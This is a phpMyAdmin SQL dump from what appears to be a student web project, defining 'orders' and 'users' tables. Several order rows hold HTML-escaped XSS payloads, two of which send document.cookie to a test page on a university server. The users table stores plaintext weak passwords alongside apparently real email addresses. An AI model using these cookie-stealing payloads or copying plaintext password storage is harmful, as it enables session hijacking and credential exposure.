-- phpMyAdmin SQL Dump
-- version 4.9.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Czas generowania: 23 Sty 2020, 15:47
-- Wersja serwera: 10.4.8-MariaDB
-- Wersja PHP: 7.1.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Baza danych: `s130719`
--

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `orders`
--

CREATE TABLE `orders` (
  `ID` int(10) NOT NULL,
  `clientID` int(10) NOT NULL,
  `orderItem` text NOT NULL,
  `description` text CHARACTER SET utf8 COLLATE utf8_polish_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Zrzut danych tabeli `orders`
--

INSERT INTO `orders` (`ID`, `clientID`, `orderItem`, `description`) VALUES
(18, 29, 'Usluga 2', 'wyngiel'),
(36, 28, 'Usluga 1', '&lt;script&gt;window.location.replace(&quot;http://www.w3schools.com&quot;);&lt;/script&gt;'),
(37, 28, 'Usluga 1', '&lt;script&gt;window.location.href = \'http://orfi.uwm.edu.pl/~s130719/test.php?cookie=\'+document.cookie&lt;/script&gt;'),
(40, 28, 'Usluga 1', 'aa'),
(46, 28, 'Usluga 1', '&lt;script&gt;window.location.replace(\"/~s130719/test.php?cookie=\"+document.cookie);&lt;/script&gt;');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `user` text COLLATE utf8_polish_ci NOT NULL,
  `pass` text COLLATE utf8_polish_ci NOT NULL,
  `email` text COLLATE utf8_polish_ci NOT NULL,
  `usergroup` tinyint(1) NOT NULL DEFAULT 0,
  `workStart` text COLLATE utf8_polish_ci DEFAULT NULL,
  `workFinish` text COLLATE utf8_polish_ci DEFAULT NULL,
  `workDesc` text COLLATE utf8_polish_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_polish_ci;

--
-- Zrzut danych tabeli `users`
--

INSERT INTO `users` (`id`, `user`, `pass`, `email`, `usergroup`, `workStart`, `workFinish`, `workDesc`) VALUES
(1, 'ldabrowski', 'qwerty', 'ld@mail.com', 1, '', '', ''),
(2, 'kbankowski', 'qwerty', 'kb@mail.com', 1, '', '', ''),
(3, 'dgrabowski', 'qwerty', 'dg@mail.com', 1, '', '', ''),
(28, 'klient', '12345', 'klient@mail.com', 0, '', '', ''),
(27, 'pracownik', '12345', 'pracownik@mail.com', 3, '12', '14', 'aaa'),
(26, 'bhp', '12345', 'bhp@mail.com', 2, '', '', ''),
(25, 'admin', '12345', 'admin@mail.com', 1, '', '', ''),
(29, '123abc', '123abc', 'dididkdj@o2.pl', 0, '', '', ''),
(30, 'oskar', 'oskar', 'oskar@gmail.com', 0, '', '', ''),
(31, 'wilczek', '12345', 'Lukaszcep@op.pl', 0, '', '', ''),
(33, 'Bumba', '123qwe', 'wla500@o2.pl', 0, '', '', '');

--
-- Indeksy dla zrzutów tabel
--

--
-- Indeksy dla tabeli `orders`
--
ALTER TABLE `orders`
  ADD PRIMARY KEY (`ID`),
  ADD KEY `clientID` (`clientID`);

--
-- Indeksy dla tabeli `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `id` (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT dla tabeli `orders`
--
ALTER TABLE `orders`
  MODIFY `ID` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=52;

--
-- AUTO_INCREMENT dla tabeli `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=34;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
